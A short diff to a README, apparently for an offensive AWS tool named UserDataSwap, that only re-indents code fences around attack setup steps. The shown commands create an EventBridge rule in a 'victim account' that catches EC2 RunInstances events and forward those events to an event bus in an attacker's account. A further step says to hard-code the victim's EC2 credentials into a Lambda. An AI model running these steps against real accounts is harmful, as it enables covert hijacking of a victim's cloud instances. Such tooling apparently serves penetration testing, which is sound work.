@@ -51,7 +51,7 @@ There is a fair amount of permissions required to deploy this, which is ok if yo
   ```
 * In the victim account:
   * Create the run-instances event trigger:
-```
+  ```
   aws --profile victim-account events put-rule --name run-instance-trigger --state ENABLED --event-bus-name default --event-pattern '{
     "source": ["aws.ec2"],
     "detail": {      
@@ -59,11 +59,11 @@ There is a fair amount of permissions required to deploy this, which is ok if yo
       "eventName": ["RunInstances"]
     }
   }'
-```
+  ```
   * Add a target to forward to the event-bus in the UserDataSwap account:
-```
+  ```
   aws events put-targets --rule run-instance-trigger --event-bus-name default --targets "Id"="1","Arn"="arn:aws:events:<region>:<attacker account #>:event-bus/run-instance-trigger"
-```
+  ```
 * You should see the UserDataSwap triggered when a instance is created in the victim account now.
   * Update the lambda to hard code the credentials needed to make EC2 related calls in the vicitims account and deploy.
 
